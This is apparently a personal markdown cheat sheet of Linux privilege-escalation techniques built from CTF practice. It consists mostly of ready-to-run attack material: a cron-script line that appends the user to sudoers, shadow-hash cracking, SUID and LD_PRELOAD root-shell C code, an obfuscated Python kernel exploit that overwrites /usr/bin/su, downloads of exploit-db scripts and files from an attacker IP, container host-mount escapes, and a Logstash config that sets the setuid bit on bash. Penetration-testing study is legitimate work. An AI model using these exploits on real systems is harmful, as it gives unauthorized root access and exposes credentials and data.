# Linux Privilege Escalation

> Personal notes built through CTF machines on HTB and TryHackMe.  
> These are real techniques that worked on real machines — not copy-paste from a course.

---
## Contents
- [Some Tools](#some-tools)
- [Cron Jobs](#cron-jobs)
- [Crack Linux User Hash](#crack-linux-user-hash)
- [Find SUID Binaries](#find-suid-binaries)
- [Capabilities](#capabilities)
- [Copy-Fail-CVE-2026-31431](#copy-fail-cve-2026-31431)
- [Network File Sharing (NFS)](#network-file-sharing-nfs)
- [Some Tricks](#some-tricks)
- [C Code to Open Root Shell](#c-code-to-open-root-shell)
- [Serve Files to Victim Machine](#serve-files-to-victim-machine)
- [Stable Shell (Python pty)](#stable-shell-python-pty)
- [LD_PRELOAD](#ld_preload)
- [screen-4.5.0 Binary Exploit](#screen-450-binary-exploit)
- [Docker Group](#docker-group)
- [Containerd (ctr) with NOPASSWD sudo](#containerd-ctr-with-nopasswd-sudo)
- [Logstash](#logstash)
- [References](#references)
## Some Tools

- **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- **LinEnum:** https://github.com/rebootuser/LinEnum
- **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester
- **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration
- **Linux Priv Checker:** https://github.com/linted/linuxprivchecker

[Reverse Shell Generator](https://www.revshells.com/)  
[GTFOBins](https://gtfobins.github.io/)

---

## Cron Jobs

> Always check cron jobs early — if a script runs as root and you can write to it, game over.

### 1. System-Wide Cron Jobs

```bash
# Check the main cron file
cat /etc/crontab

# List cron jobs in /etc/cron.d/
ls -la /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null

# Check cron directories (hourly, daily, weekly, monthly)
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

### 2. User-Specific Cron Jobs

```bash
# Check crontabs for all users (requires root)
ls -la /var/spool/cron/crontabs/

# If you have sudo access:
sudo crontab -l -u root      # Check root's cron jobs
sudo crontab -l -u ross      # Check a specific user's cron jobs
```

### 3. Systemd Timers (Alternative to Cron)

```bash
# List all active timers
systemctl list-timers --all

# Search for a specific service timer
systemctl list-timers | grep -i 'postfix\|monitor'
```

### 4. Log Analysis

```bash
# Check cron execution history
grep CRON /var/log/syslog
grep cron /var/log/syslog
```

### Exploit: Add current user to sudoers via writable cron script

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# Change "student" to your current username
```

---

## Crack Linux User Hash

```bash
echo '[username]:[Hash from /etc/shadow]' > hash.txt
echo 'jessie:$6$0w...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Find SUID Binaries

> SUID binaries run as their owner (often root) regardless of who executes them. Check GTFOBins for exploitation.

```bash
find / -perm -u=s -type f 2>/dev/null

find / -user root -perm /4000
```

> If `enlightenment_sys` exists → exploit with [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)

---

## Capabilities

> Some binaries have Linux capabilities set instead of full SUID. `cap_setuid+ep` is the one you want.

```bash
getcap -r / 2>/dev/null

# Look for cap_setuid+ep in the output
# Then check GTFOBins for that binary
```

---
## Copy-Fail-CVE-2026-31431
```bash
#check if the kernal version is affected
uname -r 
```
### Vulnerable versions:
| Kernel Branch | Vulnerable Versions |
| ------------- | ------------------- |
| 5.10 LTS      | before 5.10.254     |
| 5.15 LTS      | before 5.15.204     |
| 6.1 LTS       | before 6.1.170      |
| 6.6 LTS       | before 6.6.137      |
| 6.12          | before 6.12.85      |
| 6.18          | before 6.18.22      |
| 6.19          | before 6.19.12      |
| 7.0           | before 7.0          |


> save this script as python file:
```bash
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

```bash
ubunzu@msi:~$ python3 copy-fail.py
# whoami
root
```

> References [CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
---
## Network File Sharing (NFS)

> If `no_root_squash` is set on a writable share — you can create a SUID binary from your attacker machine.

```bash
# On victim machine - check exports
cat /etc/exports

# On attacker machine - find mountable shares
showmount -e <TARGET_IP>

# Mount the share
mkdir /tmp/anything
mount -o rw <TARGET_IP>:/backups /tmp/anything

# Create SUID binary
nano /tmp/anything/exploit.c
```

```c
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc exploit.c -o exploit -w
chmod +s exploit

# Now run it on the victim machine
/tmp/anything/exploit
```

---

## Some Tricks

```bash
# List all users cleanly
cat /etc/passwd | cut -d ":" -f 1

# Find directories you can write to
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Change PATH to /tmp (useful for PATH hijacking)
export PATH=/tmp:$PATH
```

---

## C Code to Open Root Shell

```c
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc exploit.c -o exploit -w
chmod +s exploit
./exploit
```

---

## Serve Files to Victim Machine

```bash
# On attacker machine
sudo python3 -m http.server 80

# On victim machine
wget http://<ATTACKER_IP>/linpeas.sh
# OR
curl http://<ATTACKER_IP>/linpeas.sh -o linpeas.sh
```

---

## Stable Shell (Python pty)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# If python is not installed
/bin/script -qc /bin/bash /dev/null
```

---

## LD_PRELOAD

> Works when `sudo -l` shows `env_keep+=LD_PRELOAD` for any command you can run with sudo.

```bash
# First check
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Create the malicious shared library
cd /tmp
nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Run any command you have sudo rights on with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## screen-4.5.0 Binary Exploit

> [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

### How to know the system is vulnerable

```bash
# Check the screen version
screen --version
# Vulnerable if it returns: Screen version 4.05.00 (GNU) 10-Dec-16

# Find the binary
find / -name "screen" 2>/dev/null
```

### Confirm SUID bit is set (required for the exploit to work)

```bash
ls -la /usr/bin/screen
# Look for: -rwsr-xr-x
# The 's' means SUID is set — without it this exploit won't work
```

### When to look for this

- LinPEAS highlights screen under SUID binaries
- `find / -perm -u=s -type f 2>/dev/null` shows `/usr/bin/screen`
- The machine feels old — this CVE is from 2017

### Exploit

```bash
# Download and run the exploit script
wget https://www.exploit-db.com/raw/41154 -O screen_exploit.sh
chmod +x screen_exploit.sh
./screen_exploit.sh
```

The exploit abuses screen's logging feature which runs as root due to the SUID bit. It tricks screen into creating a root-owned shared library, then loads it to get a root shell.

---

## Docker Group

> If your user is in the docker group — instant root. No exploit needed.

```bash
# Check available images
docker images

# Mount the whole filesystem into a container and chroot into it
docker run -v /:/mnt --rm -it <image_name> chroot /mnt bash
```

---
## lxd Group 
> If your user is in the lxd group get root shell by:

```bash
#in local machine (kali)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# it will generate .tar.gz file alpine-v3.22-x86_64-YYYYMMDD_HHMM.tar.gz

# Host your local via HTTP
sudo python3 -m http.server 80

# in victim machine
wget http://[YourIP]/alpine-v3.22-x86_64-20250716_2213.tar.gz


# Copy this sh script from (https://www.exploit-db.com/exploits/46978) and save it in victim machine using nano or Vim.

chmod +x LxD.sh # script you copied from exploit-db

./LxD.sh -f alpine-v3.22-x86_64-YYYYMMDD_HHMM.tar.gz

cd /mnt/root # to mount root files
```
## Containerd (ctr) with NOPASSWD sudo

```bash
# Example from a machine where jasmine could run ctr as root:
# (ALL) NOPASSWD: /usr/bin/ctr

sudo ctr image list

# Create mount point
mkdir /tmp/host

# Mount host filesystem into container and read root files
sudo ctr run --rm --mount "type=bind,src=/,dst=/host,options=rbind" docker.io/library/alpine:latest readflag sh -c "cat /host/root/flag.txt"
```

> [HackTricks - ctr Privilege Escalation](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation)

---

## Logstash

> Works when Logstash runs as root and you have write permission on a pipeline config.

```bash
# Check if Logstash exists
ls -all /etc/logstash/pipelines.yml

# Check if Logstash is running as a high privilege user
ps aux | grep logstash

# YOU NEED WRITE PERMISSION ON ONE OF THESE
ls -all /etc/logstash/pipelines.yml
ls -all /etc/logstash/conf.d

# Create a malicious pipeline config
nano /etc/logstash/conf.d/pwn.conf
```

```ruby
input {
  exec {
    command => "chmod u+s /bin/bash"
    interval => 60
  }
}

output {
  file {
    path => "/tmp/pwned.log"
    codec => rubydebug
  }
}
```

```bash
# Wait ~60 seconds then
/bin/bash -p
# BOOM — root shell
```

> [HackTricks - Logstash](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/logstash)

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Reverse Shell Cheat Sheet](https://gist.github.com/sckalath/67a59eb4955f1f9aedde)
- [Exploit-DB](https://www.exploit-db.com/)
